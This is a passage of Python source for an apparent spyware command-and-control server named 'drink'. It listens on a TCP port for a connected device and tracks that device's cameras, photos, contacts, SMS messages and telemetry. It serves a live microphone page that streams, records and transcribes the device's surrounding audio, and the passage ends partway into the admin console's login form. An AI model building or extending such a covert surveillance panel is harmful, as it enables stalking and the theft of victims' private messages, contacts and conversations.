import asyncio
import io
import json
import os
import struct
import sys
import threading
import time
import zipfile
from collections import deque
from pathlib import Path
from typing import Optional, Set

import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse, Response

TCP_HOST = "192.168.1.149"
TCP_PORT = 33110
WEB_PORT = 3000

app = FastAPI()

state = {
    "tcp_server": None,
    "client_reader": None,
    "client_writer": None,
    "client_addr": None,
    "listening": False,
    "mic_active": False,
    "cameras": [],
    "latest_photo": None,
    "latest_photo_bytes": None,
    "latest_contacts": None,
    "latest_contacts_bytes": None,
    "latest_sms": [],
    "contacts_list": [],
    "latest_telemetry": None,
}

logs = deque(maxlen=100)
audio_clients: Set[WebSocket] = set()
loop: asyncio.AbstractEventLoop = None


def log_event(msg: str):
    ts = time.strftime("%H:%M:%S")
    formatted = f"[{ts}] {msg}"
    logs.append(formatted)


HTML_MIC_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>drink — Mic Stream</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #fbfbfd;
    color: #1d1d1f;
    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
  }
  .card {
    background: #ffffff;
    border: 1px solid #e5e5ea;
    border-radius: 20px;
    box-shadow: 0 4px 24px rgba(0, 0, 0, 0.04);
    padding: 32px 36px;
    max-width: 460px;
    width: 100%;
    text-align: center;
  }
  h1 {
    font-size: 1.45rem;
    font-weight: 600;
    letter-spacing: -0.02em;
    margin-bottom: 6px;
  }
  p.subtitle {
    color: #86868b;
    font-size: 0.88rem;
    margin-bottom: 20px;
  }
  .indicator-box {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    margin-bottom: 20px;
  }
  .pulse-dot {
    width: 10px;
    height: 10px;
    border-radius: 50%;
    background: #86868b;
    transition: all 0.3s;
  }
  .pulse-dot.active {
    background: #34c759;
    box-shadow: 0 0 10px rgba(52, 199, 89, 0.6);
  }
  #status {
    font-size: 0.9rem;
    font-weight: 500;
  }
  .visualizer-wrap {
    margin-bottom: 16px;
  }
  canvas#waveformCanvas {
    width: 100%;
    height: 72px;
    border-radius: 12px;
    background: #141416;
    display: block;
  }
  .vu-bar-wrap {
    width: 100%;
    height: 5px;
    background: #e5e5ea;
    border-radius: 999px;
    overflow: hidden;
    margin-top: 8px;
  }
  .vu-bar-fill {
    width: 0%;
    height: 100%;
    background: #34c759;
    transition: width 0.05s ease;
  }
  .control-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 12px;
    background: #f5f5f7;
    padding: 10px 14px;
    border-radius: 12px;
    margin-bottom: 16px;
  }
  .control-label {
    font-size: 0.82rem;
    font-weight: 600;
    color: #636366;
  }
  .gain-slider {
    flex: 1;
    accent-color: #0071e3;
    cursor: pointer;
  }
  .gain-val {
    font-size: 0.82rem;
    font-weight: 700;
    min-width: 38px;
    text-align: right;
  }
  .actions-row {
    display: flex;
    gap: 8px;
    justify-content: center;
    margin-bottom: 16px;
  }
  .btn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    padding: 9px 16px;
    border-radius: 980px;
    font-size: 0.82rem;
    font-weight: 500;
    text-decoration: none;
    border: none;
    cursor: pointer;
    transition: all 0.15s;
  }
  .btn-secondary {
    background: #f5f5f7;
    color: #1d1d1f;
  }
  .btn-secondary:hover {
    background: #e8e8ed;
  }
  .btn-danger {
    background: #ffebeb;
    color: #ff3b30;
    border: 1px solid rgba(255, 59, 48, 0.2);
  }
  .rec-dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background: #ff3b30;
    display: inline-block;
  }
  .rec-dot.pulsing {
    animation: pulse 1s infinite;
  }
  @keyframes pulse {
    0% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.3); opacity: 0.4; }
    100% { transform: scale(1); opacity: 1; }
  }
  .stt-section {
    text-align: left;
    margin-top: 14px;
    padding-top: 14px;
    border-top: 1px solid #e5e5ea;
  }
  .stt-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 8px;
  }
  .stt-title {
    font-size: 0.78rem;
    font-weight: 600;
    color: #86868b;
    text-transform: uppercase;
    letter-spacing: 0.04em;
  }
  .stt-box {
    background: #f9f9fb;
    border: 1px solid #e5e5ea;
    border-radius: 12px;
    padding: 12px;
    min-height: 84px;
    max-height: 120px;
    overflow-y: auto;
    font-size: 0.84rem;
    line-height: 1.45;
    color: #1d1d1f;
    word-break: break-word;
  }
  .footer-links {
    margin-top: 20px;
  }
</style>
</head>
<body>
<div class="card">
  <h1>Microphone Stream</h1>
  <p class="subtitle">Live audio stream from connected device</p>
  <div class="indicator-box">
    <div class="pulse-dot" id="dot"></div>
    <span id="status">Connecting…</span>
  </div>

  <div class="visualizer-wrap">
    <canvas id="waveformCanvas" width="380" height="72"></canvas>
    <div class="vu-bar-wrap">
      <div class="vu-bar-fill" id="vuBar"></div>
    </div>
  </div>

  <div class="control-row">
    <span class="control-label">Gain Multiplier</span>
    <input type="range" class="gain-slider" id="gainSlider" min="1" max="5" step="0.2" value="1" oninput="changeGain(this.value)">
    <span class="gain-val" id="gainVal">1.0x</span>
  </div>

  <div class="actions-row">
    <button class="btn btn-secondary" id="btnRecord" onclick="toggleRecord()">
      <span class="rec-dot" id="recDot"></span>
      <span id="recText">Record Audio</span>
    </button>
  </div>

  <div class="stt-section">
    <div class="stt-header">
      <span class="stt-title">Live Transcription (STT)</span>
      <div style="display: flex; gap: 6px;">
        <button class="btn btn-secondary" style="padding: 4px 10px; font-size: 0.72rem;" id="btnStt" onclick="toggleStt()">Start</button>
        <button class="btn btn-secondary" style="padding: 4px 10px; font-size: 0.72rem;" onclick="clearStt()">Clear</button>
        <button class="btn btn-secondary" style="padding: 4px 10px; font-size: 0.72rem;" onclick="copyStt()">Copy</button>
      </div>
    </div>
    <div class="stt-box" id="sttBox">Listening for ambient speech…</div>
  </div>

  <div class="footer-links">
    <a href="/" class="btn btn-secondary">← Admin Panel</a>
  </div>
</div>
<script>
(function () {
  const status = document.getElementById('status');
  const dot = document.getElementById('dot');
  const canvas = document.getElementById('waveformCanvas');
  const canvasCtx = canvas.getContext('2d');
  const vuBar = document.getElementById('vuBar');
  const gainVal = document.getElementById('gainVal');
  const btnRecord = document.getElementById('btnRecord');
  const recDot = document.getElementById('recDot');
  const recText = document.getElementById('recText');
  const sttBox = document.getElementById('sttBox');
  const btnStt = document.getElementById('btnStt');

  const ctx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
  const analyser = ctx.createAnalyser();
  analyser.fftSize = 256;
  const gainNode = ctx.createGain();
  gainNode.gain.value = 1.0;
  analyser.connect(gainNode);
  gainNode.connect(ctx.destination);

  let isRecording = false;
  let recordedChunks = [];
  let recordTimer = null;
  let recordSeconds = 0;

  let recognition = null;
  let isSttRunning = false;

  const ws = new WebSocket('ws://' + location.hostname + ':' + location.port + '/ws/audio');
  ws.binaryType = 'arraybuffer';

  ws.onopen = () => {
    status.textContent = 'Connected — waiting for audio';
    dot.className = 'pulse-dot active';
  };
  ws.onclose = () => {
    status.textContent = 'Disconnected';
    dot.className = 'pulse-dot';
  };
  ws.onerror = () => {
    status.textContent = 'Error';
    dot.className = 'pulse-dot';
  };

  let nextTime = 0;

  ws.onmessage = (event) => {
    const pcm = new Int16Array(event.data);
    if (isRecording) {
      recordedChunks.push(new Int16Array(pcm));
    }
    const float32 = new Float32Array(pcm.length);
    for (let i = 0; i < pcm.length; i++) {
      float32[i] = pcm[i] / 32768.0;
    }
    const buffer = ctx.createBuffer(1, float32.length, 16000);
    buffer.copyToChannel(float32, 0);
    const source = ctx.createBufferSource();
    source.buffer = buffer;
    source.connect(analyser);
    const now = ctx.currentTime;
    const startAt = Math.max(now, nextTime);
    source.start(startAt);
    nextTime = startAt + buffer.duration;
    status.textContent = 'Streaming live';
  };

  window.changeGain = function(val) {
    const v = parseFloat(val);
    gainNode.gain.value = v;
    gainVal.textContent = v.toFixed(1) + 'x';
  };

  const bufferLength = analyser.frequencyBinCount;
  const dataArray = new Uint8Array(bufferLength);

  function draw() {
    requestAnimationFrame(draw);
    analyser.getByteTimeDomainData(dataArray);

    canvasCtx.fillStyle = '#141416';
    canvasCtx.fillRect(0, 0, canvas.width, canvas.height);

    canvasCtx.lineWidth = 2;
    canvasCtx.strokeStyle = '#34c759';
    canvasCtx.beginPath();

    const sliceWidth = canvas.width * 1.0 / bufferLength;
    let x = 0;
    let maxDiff = 0;

    for (let i = 0; i < bufferLength; i++) {
      const v = dataArray[i] / 128.0;
      const y = v * (canvas.height / 2);
      const diff = Math.abs(dataArray[i] - 128);
      if (diff > maxDiff) maxDiff = diff;

      if (i === 0) {
        canvasCtx.moveTo(x, y);
      } else {
        canvasCtx.lineTo(x, y);
      }
      x += sliceWidth;
    }
    canvasCtx.lineTo(canvas.width, canvas.height / 2);
    canvasCtx.stroke();

    const pct = Math.min(100, Math.round((maxDiff / 128.0) * 100 * 1.5));
    vuBar.style.width = pct + '%';
    if (pct > 70) {
      vuBar.style.backgroundColor = '#ff3b30';
    } else if (pct > 35) {
      vuBar.style.backgroundColor = '#ff9500';
    } else {
      vuBar.style.backgroundColor = '#34c759';
    }
  }
  draw();

  window.toggleRecord = function() {
    if (!isRecording) {
      isRecording = true;
      recordedChunks = [];
      recordSeconds = 0;
      btnRecord.className = 'btn btn-danger';
      recDot.className = 'rec-dot pulsing';
      recText.textContent = 'Stop & Save (00:00)';
      recordTimer = setInterval(() => {
        recordSeconds++;
        const mins = String(Math.floor(recordSeconds / 60)).padStart(2, '0');
        const secs = String(recordSeconds % 60).padStart(2, '0');
        recText.textContent = `Stop & Save (${mins}:${secs})`;
      }, 1000);
    } else {
      isRecording = false;
      clearInterval(recordTimer);
      btnRecord.className = 'btn btn-secondary';
      recDot.className = 'rec-dot';
      recText.textContent = 'Record Audio';
      saveRecording();
    }
  };

  function saveRecording() {
    if (recordedChunks.length === 0) return;
    let totalSamples = 0;
    for (let c of recordedChunks) totalSamples += c.length;
    const wavBuffer = new ArrayBuffer(44 + totalSamples * 2);
    const view = new DataView(wavBuffer);

    function writeStr(offset, str) {
      for (let i = 0; i < str.length; i++) {
        view.setUint8(offset + i, str.charCodeAt(i));
      }
    }

    writeStr(0, 'RIFF');
    view.setUint32(4, 36 + totalSamples * 2, true);
    writeStr(8, 'WAVE');
    writeStr(12, 'fmt ');
    view.setUint32(16, 16, true);
    view.setUint16(20, 1, true);
    view.setUint16(22, 1, true);
    view.setUint32(24, 16000, true);
    view.setUint32(28, 32000, true);
    view.setUint16(32, 2, true);
    view.setUint16(34, 16, true);
    writeStr(36, 'data');
    view.setUint32(40, totalSamples * 2, true);

    let offset = 44;
    for (let c of recordedChunks) {
      for (let i = 0; i < c.length; i++) {
        view.setInt16(offset, c[i], true);
        offset += 2;
      }
    }

    const blob = new Blob([wavBuffer], { type: 'audio/wav' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `drink_mic_${Date.now()}.wav`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    recordedChunks = [];
  }

  window.toggleStt = function() {
    const SpeechRec = window.SpeechRecognition || window.webkitSpeechRecognition;
    if (!SpeechRec) {
      alert('Speech Recognition is not supported by your browser');
      return;
    }
    if (!isSttRunning) {
      recognition = new SpeechRec();
      recognition.continuous = true;
      recognition.interimResults = true;
      recognition.onstart = () => {
        isSttRunning = true;
        btnStt.textContent = 'Stop';
        btnStt.className = 'btn btn-danger';
      };
      recognition.onresult = (e) => {
        let text = '';
        for (let i = 0; i < e.results.length; i++) {
          text += e.results[i][0].transcript + ' ';
        }
        if (text.trim()) {
          sttBox.textContent = text;
          sttBox.scrollTop = sttBox.scrollHeight;
        }
      };
      recognition.onerror = () => {
        isSttRunning = false;
        btnStt.textContent = 'Start';
        btnStt.className = 'btn btn-secondary';
      };
      recognition.onend = () => {
        if (isSttRunning) {
          try { recognition.start(); } catch(e){}
        } else {
          btnStt.textContent = 'Start';
          btnStt.className = 'btn btn-secondary';
        }
      };
      recognition.start();
    } else {
      isSttRunning = false;
      if (recognition) recognition.stop();
      btnStt.textContent = 'Start';
      btnStt.className = 'btn btn-secondary';
    }
  };

  window.clearStt = function() {
    sttBox.textContent = '';
  };

  window.copyStt = function() {
    navigator.clipboard.writeText(sttBox.textContent);
  };
})();
</script>
</body>
</html>"""

HTML_ADMIN_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>drink — Admin Console</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
  :root {
    --bg-page: #f2f2f7;
    --bg-card: #ffffff;
    --bg-card-hover: #fafafa;
    --bg-card-subtle: #f9f9fb;
    --bg-input: #ffffff;
    --border: #e2e2e8;
    --border-light: #ececf0;
    --text-main: #1c1c1e;
    --text-muted: #8e8e93;
    --text-sub: #636366;
    --accent: #0071e3;
    --accent-hover: #0077ed;
    --accent-light: #e8f2fd;
    --success: #34c759;
    --success-light: #e6f9ec;
    --warning: #ff9500;
    --warning-light: #fff5e5;
    --danger: #ff3b30;
    --danger-light: #ffebeb;
    --header-bg: rgba(255, 255, 255, 0.85);
    --shadow-sm: 0 1px 3px rgba(0, 0, 0, 0.04);
    --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.06);
    --radius-sm: 8px;
    --radius-md: 12px;
    --radius-lg: 18px;
    --radius-pill: 9999px;
    --font: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", sans-serif;
    --font-mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
  }
  body.dark-mode {
    --bg-page: #0d0d11;
    --bg-card: #17171d;
    --bg-card-hover: #1c1c24;
    --bg-card-subtle: #1e1e24;
    --bg-input: #1e1e24;
    --border: #282834;
    --border-light: #242430;
    --text-main: #f5f5f7;
    --text-muted: #8e8e93;
    --text-sub: #a1a1a6;
    --accent: #2997ff;
    --accent-hover: #47a6ff;
    --accent-light: #122842;
    --success: #30d158;
    --success-light: #10341c;
    --warning: #ff9f0a;
    --warning-light: #38240a;
    --danger: #ff453a;
    --danger-light: #381515;
    --header-bg: rgba(23, 23, 29, 0.85);
    --shadow-sm: 0 1px 4px rgba(0, 0, 0, 0.3);
    --shadow-md: 0 6px 24px rgba(0, 0, 0, 0.4);
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: var(--bg-page);
    color: var(--text-main);
    font-family: var(--font);
    min-height: 100vh;
    padding-bottom: 60px;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    text-rendering: optimizeLegibility;
    transition: background-color 0.2s ease, color 0.2s ease;
  }
  body.lang-fa {
    font-family: 'Vazirmatn', var(--font);
    direction: rtl;
  }
  body.lang-fa .log-console {
    direction: ltr;
    text-align: left;
    font-family: ui-monospace, SFMono-Regular, Menlo, monospace !important;
  }
  body.lang-fa input[type="number"],
  body.lang-fa input[type="date"],
  body.lang-fa .monospace-val {
    direction: ltr;
    text-align: right;
  }
  header {
    background: var(--header-bg);
    backdrop-filter: blur(24px);
    -webkit-backdrop-filter: blur(24px);
    border-bottom: 1px solid var(--border);
    position: sticky;
    top: 0;
    z-index: 200;
    padding: 10px 24px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    box-shadow: var(--shadow-sm);
  }
  .header-left {
    display: flex;
    align-items: center;
    gap: 16px;
  }
  .brand-wrap {
    display: flex;
    align-items: center;
    gap: 8px;
    text-decoration: none;
    color: var(--text-main);
  }
  .brand-icon {
    width: 32px;
    height: 32px;
    border-radius: 10px;
    background: linear-gradient(135deg, #0071e3, #5856d6);
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 2px 8px rgba(0, 113, 227, 0.35);
  }
  .brand-name {
    font-size: 1.28rem;
    font-weight: 700;
    letter-spacing: -0.03em;
  }
  .status-badges {
    display: flex;
    align-items: center;
    gap: 8px;
    flex-wrap: wrap;
  }
  .badge {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    font-size: 0.73rem;
    font-weight: 600;
    padding: 4px 10px;
    border-radius: var(--radius-pill);
    background: var(--border);
    color: var(--text-muted);
    transition: all 0.2s ease;
  }
  .badge-dot {
    width: 7px;
    height: 7px;
    border-radius: 50%;
    background: var(--text-muted);
  }
  .badge-active {
    background: var(--success-light);
    color: var(--success);
  }
  .badge-active .badge-dot {
    background: var(--success);
    box-shadow: 0 0 8px var(--success);
  }
  .badge-warning {
    background: var(--warning-light);
    color: var(--warning);
  }
  .badge-warning .badge-dot {
    background: var(--warning);
    box-shadow: 0 0 8px var(--warning);
  }
  .header-actions {
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .header-divider {
    width: 1px;
    height: 20px;
    background: var(--border);
    margin: 0 4px;
  }
  button, .btn {
    font-family: inherit;
    font-size: 0.82rem;
    font-weight: 500;
    border: none;
    border-radius: var(--radius-sm);
    padding: 7px 13px;
    cursor: pointer;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    transition: all 0.16s cubic-bezier(0.4, 0, 0.2, 1);
    text-decoration: none;
    outline: none;
  }
  button:hover, .btn:hover {
    transform: translateY(-1px);
  }
  button:active, .btn:active {
    transform: translateY(0) scale(0.98);
  }
  .btn-primary {
    background: var(--accent);
    color: #fff;
    box-shadow: 0 2px 8px rgba(0, 113, 227, 0.25);
  }
  .btn-primary:hover {
    background: var(--accent-hover);
  }
  .btn-secondary {
    background: var(--bg-card);
    color: var(--text-main);
    border: 1px solid var(--border);
  }
  .btn-secondary:hover {
    background: var(--bg-card-hover);
    border-color: var(--border-focus);
  }
  .btn-success {
    background: var(--success);
    color: #fff;
    box-shadow: 0 2px 8px rgba(52, 199, 89, 0.25);
  }
  .btn-danger {
    background: var(--danger-light);
    color: var(--danger);
    border: 1px solid rgba(255, 59, 48, 0.25);
  }
  .btn-danger:hover {
    background: var(--danger);
    color: #fff;
  }
  .btn-icon {
    padding: 7px;
    min-width: 34px;
    height: 34px;
    border-radius: 9px;
  }
  .container {
    max-width: 1200px;
    margin: 22px auto 0 auto;
    padding: 0 20px;
    display: flex;
    flex-direction: column;
    gap: 20px;
  }
  .overview-grid {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 16px;
  }
  @media (max-width: 980px) {
    .overview-grid { grid-template-columns: 1fr; }
    header { flex-direction: column; gap: 12px; align-items: flex-start; }
    .header-actions { width: 100%; justify-content: flex-end; }
  }
  .card {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: var(--radius-md);
    padding: 18px 20px;
    box-shadow: var(--shadow-sm);
    display: flex;
    flex-direction: column;
    position: relative;
    transition: border-color 0.2s, box-shadow 0.2s;
  }
  .card:hover {
    box-shadow: var(--shadow-md);
  }
  .card-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 14px;
  }
  .card-title-wrap {
    display: flex;
    align-items: center;
    gap: 9px;
  }
  .card-icon-badge {
    width: 30px;
    height: 30px;
    border-radius: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
    background: var(--accent-light);
    color: var(--accent);
  }
  .card-title {
    font-size: 0.95rem;
    font-weight: 600;
    letter-spacing: -0.01em;
  }
  .card-body {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 8px;
  }
  .info-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 0.82rem;
    padding: 5px 0;
    border-bottom: 1px solid var(--border-light);
  }
  .info-label { color: var(--text-muted); }
  .info-val { font-weight: 500; }
  .monospace-val { font-family: var(--font-mono); font-size: 0.8rem; }
  .card-footer-actions {
    margin-top: 14px;
    display: flex;
    gap: 8px;
    flex-wrap: wrap;
  }
  .cam-pills-row {
    display: flex;
    gap: 6px;
    align-items: center;
    margin-bottom: 8px;
  }
  .cam-pill-btn {
    padding: 4px 10px;
    border-radius: 7px;
    font-size: 0.74rem;
    background: var(--border-light);
    color: var(--text-main);
    border: 1px solid var(--border);
    cursor: pointer;
  }
  .cam-pill-btn.active {
    background: var(--accent);
    color: #fff;
    border-color: var(--accent);
  }
  .preview-container {
    height: 120px;
    border-radius: 10px;
    background: var(--border-light);
    border: 1px solid var(--border);
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    position: relative;
  }
  .preview-container img {
    width: 100%;
    height: 100%;
    object-fit: cover;
  }
  .preview-empty-state {
    font-size: 0.78rem;
    color: var(--text-muted);
    display: flex;
    align-items: center;
    gap: 6px;
  }
  .workspace-card {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: var(--radius-lg);
    box-shadow: var(--shadow-sm);
    overflow: hidden;
    display: flex;
    flex-direction: column;
    min-height: 520px;
  }
  .workspace-tabbar {
    display: flex;
    align-items: center;
    background: var(--bg-card-subtle);
    border-bottom: 1px solid var(--border);
    padding: 6px 16px;
    gap: 8px;
    overflow-x: auto;
  }
  .tab-btn {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    padding: 8px 16px;
    border-radius: 9px;
    background: transparent;
    color: var(--text-muted);
    font-size: 0.84rem;
    font-weight: 600;
    border: none;
    cursor: pointer;
    transition: all 0.15s ease;
  }
  .tab-btn:hover {
    color: var(--text-main);
    background: rgba(0, 0, 0, 0.03);
  }
  body.dark-mode .tab-btn:hover {
    background: rgba(255, 255, 255, 0.05);
  }
  .tab-btn.active {
    background: var(--bg-card);
    color: var(--accent);
    box-shadow: var(--shadow-sm);
  }
  .tab-count-badge {
    font-size: 0.72rem;
    padding: 2px 7px;
    border-radius: var(--radius-pill);
    background: var(--border);
    color: var(--text-main);
    font-weight: 600;
  }
  .tab-btn.active .tab-count-badge {
    background: var(--accent-light);
    color: var(--accent);
  }
  .workspace-content {
    flex: 1;
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }
  .tab-panel {
    display: none;
    flex-direction: column;
    flex: 1;
    height: 100%;
  }
  .tab-panel.active {
    display: flex;
  }
  .panel-toolbar {
    padding: 12px 18px;
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    gap: 10px;
    flex-wrap: wrap;
    background: var(--bg-card);
  }
  .search-box {
    display: flex;
    align-items: center;
    gap: 8px;
    background: var(--bg-input);
    border: 1px solid var(--border);
    border-radius: 9px;
    padding: 6px 12px;
    flex: 1;
    min-width: 200px;
    color: var(--text-main);
  }
  .search-box input {
    border: none;
    background: transparent;
    outline: none;
    font-size: 0.83rem;
    width: 100%;
    color: inherit;
    font-family: inherit;
  }
  input[type="text"], input[type="number"], input[type="date"], input[type="password"] {
    border: 1px solid var(--border);
    border-radius: var(--radius-sm);
    padding: 6px 10px;
    font-size: 0.82rem;
    background: var(--bg-input);
    color: var(--text-main);
    outline: none;
    transition: border-color 0.15s;
    font-family: inherit;
  }
  input:focus {
    border-color: var(--border-focus);
  }
  .filter-pills-wrap {
    display: flex;
    gap: 4px;
    background: var(--border-light);
    padding: 3px;
    border-radius: 8px;
  }
  .filter-item-pill {
    border: none;
    background: transparent;
    padding: 4px 10px;
    font-size: 0.75rem;
    font-weight: 600;
    border-radius: 6px;
    color: var(--text-muted);
    cursor: pointer;
  }
  .filter-item-pill.active {
    background: var(--bg-card);
    color: var(--accent);
    box-shadow: var(--shadow-sm);
  }
  .panel-body-scroll {
    flex: 1;
    overflow-y: auto;
    padding: 18px;
    background: var(--bg-page);
    max-height: 580px;
  }
  .messages-flow {
    display: flex;
    flex-direction: column;
    gap: 10px;
  }
  .msg-item-card {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: var(--radius-md);
    padding: 13px 16px;
    display: flex;
    flex-direction: column;
    gap: 6px;
    box-shadow: var(--shadow-sm);
    transition: transform 0.15s, border-color 0.15s;
  }
  .msg-item-card:hover {
    border-color: var(--accent);
  }
  .msg-header-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 0.78rem;
  }
  .msg-tag {
    font-size: 0.69rem;
    font-weight: 700;
    padding: 2px 8px;
    border-radius: 4px;
  }
  .msg-tag-in {
    background: var(--success-light);
    color: var(--success);
  }
  .msg-tag-out {
    background: var(--accent-light);
    color: var(--accent);
  }
  .msg-text-body {
    font-size: 0.88rem;
    line-height: 1.45;
    word-break: break-word;
    color: var(--text-main);
  }
  .contacts-flow-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
    gap: 12px;
  }
  .contact-box {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: var(--radius-md);
    padding: 12px 14px;
    display: flex;
    align-items: center;
    gap: 12px;
    transition: transform 0.15s, border-color 0.15s;
  }
  .contact-box:hover {
    border-color: var(--accent);
    box-shadow: var(--shadow-sm);
  }
  .contact-avatar-bubble {
    width: 38px;
    height: 38px;
    border-radius: 50%;
    background: var(--accent-light);
    color: var(--accent);
    font-weight: 700;
    font-size: 0.88rem;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
  }
  .contact-details {
    flex: 1;
    overflow: hidden;
  }
  .contact-title {
    font-size: 0.88rem;
    font-weight: 600;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
  .contact-num-link {
    font-size: 0.78rem;
    color: var(--accent);
    text-decoration: none;
  }
  .log-terminal-window {
    display: flex;
    flex-direction: column;
    flex: 1;
    background: #141416;
    border-radius: 0 0 var(--radius-lg) var(--radius-lg);
    overflow: hidden;
  }
  .log-terminal-bar {
    background: #1c1c20;
    padding: 8px 14px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid #282830;
  }
  .log-console {
    background: transparent;
    color: #30d158;
    font-family: var(--font-mono);
    font-size: 0.78rem;
    padding: 14px 18px;
    height: 460px;
    overflow-y: auto;
    white-space: pre-wrap;
    line-height: 1.5;
  }
  .modal-backdrop {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.65);
    backdrop-filter: blur(12px);
    -webkit-backdrop-filter: blur(12px);
    z-index: 1000;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  #loginScreen {
    position: fixed;
    inset: 0;
    z-index: 9999;
    display: flex;
    align-items: center;
    justify-content: center;
    background: var(--bg-page);
    padding: 20px;
  }
  .login-card {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: 20px;
    box-shadow: var(--shadow-md);
    width: 100%;
    max-width: 370px;
    padding: 34px 28px;
    text-align: center;
  }
  .login-icon {
    width: 52px;
    height: 52px;
    border-radius: 14px;
    background: linear-gradient(135deg, #0071e3, #5856d6);
    color: #ffffff;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 16px;
    box-shadow: 0 4px 14px rgba(0, 113, 227, 0.35);
  }
  .login-title {
    font-size: 1.3rem;
    font-weight: 700;
    letter-spacing: -0.02em;
    margin-bottom: 6px;
  }
  .login-subtitle {
    font-size: 0.82rem;
    color: var(--text-muted);
    margin-bottom: 22px;
  }
  .login-field {
    margin-bottom: 14px;
    text-align: left;
  }
  body.lang-fa .login-field {
    text-align: right;
  }
  .login-field label {
    display: block;
    font-size: 0.76rem;
    font-weight: 600;
    margin-bottom: 6px;
    color: var(--text-muted);
  }
  .login-field input {
    width: 100%;
    padding: 9px 12px;
    font-size: 0.88rem;
    border-radius: 9px;
  }
  .login-btn {
    width: 100%;
    padding: 10px;
    font-size: 0.88rem;
    font-weight: 600;
    margin-top: 8px;
  }
  .login-error {
    color: var(--danger);
    font-size: 0.78rem;
    margin-top: 12px;
    display: none;
    background: var(--danger-light);
    border: 1px solid rgba(255, 59, 48, 0.2);
    border-radius: 8px;
    padding: 8px;
  }
  .telemetry-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 14px;
  }
  @media (max-width: 820px) {
    .telemetry-grid { grid-template-columns: 1fr; }
  }
  .progress-bar-wrap {
    width: 100%;
    height: 7px;
    background: var(--border-light);
    border-radius: var(--radius-pill);
    overflow: hidden;
  }
  .progress-bar-fill {
    height: 100%;
    border-radius: var(--radius-pill);
    transition: width 0.3s ease;
  }
  .leaflet-container {
    font-family: inherit;
  }
  .rec-pulse-dot {
    width: 7px;
    height: 7px;
    border-radius: 50%;
    background: var(--danger);
    display: inline-block;
  }
  .rec-pulse-dot.active {
    animation: recPulse 1s infinite;
  }
  @keyframes recPulse {
    0% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.3; transform: scale(1.3); }
    100% { opacity: 1; transform: scale(1); }
  }
</style>
</head>
<body>
<div id="loginScreen">
  <div class="login-card">
    <div class="login-icon">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
    </div>
    <div class="login-title" data-i18n="login_title">Admin Console</div>
    <div class="login-subtitle" data-i18n="login_subtitle">Enter credentials to access the panel</div>
    <div class="login-field">
      <label data-i18n="username">Username</label>
